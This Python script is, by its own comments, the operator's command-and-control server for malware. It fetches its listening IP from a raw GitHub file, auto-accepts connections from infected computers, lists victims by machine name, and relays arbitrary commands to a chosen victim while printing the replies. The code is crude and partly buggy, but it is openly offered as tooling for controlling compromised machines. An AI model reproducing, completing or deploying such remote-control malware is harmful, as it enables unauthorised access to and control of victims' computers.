import requests
import socket
import threading

user_connections = []
user_names = []
useramount = 0


def mainmenu():
    menu = input("HOME> ")
    menu = menu.lower()
    if menu == "help":
        print("Connections | Will check the most recent connections and allow you to choose a user that ran the malware")
        print("Connect | Will allow you to chose what computer to connect too")
        mainmenu()
    elif menu == "connections":
        connectionpage()
    elif menu == "connect":
        handleconnections()
    else:
        print("Invalid command")
        mainmenu()

#handles all new connections and should repeatidly scan for new incoming connections
def newconnection():
    global useramount
    useramount = useramount + 1 #adds one to the user amount
    userlist = client_socket.recv(1024).decode()
    print(f"Connection received{userlist}")
    user_names.append(userlist) #adds the user computer name to the lsit
    user_connections.append((client_socket)) #adds the user socket to the list in the same position that name is for simpliar access
    print(user_connections)
    print(user_names)
    mainmenu() #main menu function  durrr


def handleconnections(*args):
    global addr
    global client_socket
    #creates a constantly running connection
    while True:
        s.listen(5)
        client_socket, addr = s.accept() #will auto accept any incoming requests
        newconnection()


#main menu function were you check your connected user's you have been infected
def connectionpage():
    for i in range(len(user_connections)):
        print(f"{i + 1} --> {user_names[i - 1]}")
    connectionbranch = int(input("CONNECTION> "))
    selected = connectionbranch - 1
    usersocket = user_connections[selected]
    username = user_names[selected]
    print(usersocket)
    communication(usersocket, username)  #runs the communication command which i fr dont even need but ill check some more things out


def handle_client(client_socket):
    while True:

        data = client_socket.recv(1024)
        if not data:
            print("ERROR connection closed ERROR")
            break
        print(f"Received from client: {data.decode()}") 
        client_socket.sendall(data) 

    client_socket.close()

#server function Durrr
def server():
    global hostip
    global port
    global s
    global client_socket
    link = "https://raw.githubusercontent.com/80dropz/communication/refs/heads/main/ipv4.txt"
    data = requests.get(link)
    hostip = data.text.strip()  #gets the host ip from my link then strips it down to just a raw textfield
    port = 65432
    print(f"Server will listen on {hostip}:{port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#starts the socket
    s.bind((hostip, port))
    print(f"Binding to {hostip} on port {port}")
    handleconnectionsthread = threading.Thread(target=handleconnections, args=(s,))
    handleconnectionsthread.start()

def communication(UserSelected, username):
    while True:
        command = input(f"{username} COMMAND> ")
        if command.lower() == 'exit':
            print("Closing connection.")
            mainmenu()
            break
        UserSelected.sendall(command.encode())
        print(f"Sent a command to {UserSelected}")
        response = client_socket.recv(1024)
        if not response:
            print("ERROR couldnt receive a response ERROR")
            break
        print(f"Client response: {response.decode()}")
    s.close()



#Will instantly run the server
if __name__ == "__main__":
    server()
